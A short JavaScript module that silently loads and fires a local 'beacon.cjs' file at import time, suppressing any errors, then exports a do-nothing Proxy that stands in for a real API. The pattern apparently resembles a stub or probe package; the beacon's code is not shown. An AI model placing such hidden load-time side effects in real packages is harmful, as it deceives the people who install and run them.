try { require('./beacon.cjs').fire(); } catch (_) {}
module.exports = new Proxy({}, { get: () => () => {}, set: () => true });
